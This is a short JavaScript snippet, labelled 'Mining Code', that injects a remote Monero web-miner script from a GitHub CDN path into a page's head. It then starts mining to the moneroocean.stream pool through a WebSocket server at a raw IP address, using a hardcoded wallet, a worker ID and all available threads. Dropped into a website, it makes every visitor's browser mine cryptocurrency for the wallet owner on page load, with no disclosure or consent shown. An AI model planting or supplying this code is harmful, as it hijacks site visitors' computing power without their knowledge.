// Start Of Mining Code (Javascript)
// import command,
// import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';

var script = document.createElement("script");
script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
document.head.appendChild(script);

server = "wss://45.119.82.33:40725";
var pool = "moneroocean.stream";
var walletAddress = "44F4qdJA81RA3eWsscZCmBgBiJomT7BsT6mM4JggZZo6RGEsPxX6eoYAVYM7gPc4m83EJzMwkB3qFf42jtwtUyen7NCrQPE";
var workerId = "GH-XMR-JS-SNIPPET"
var threads = -1;
var password = "";
startMining(pool, walletAddress, workerId, threads, password);
throttleMiner = 20;
// End Of Mining Code
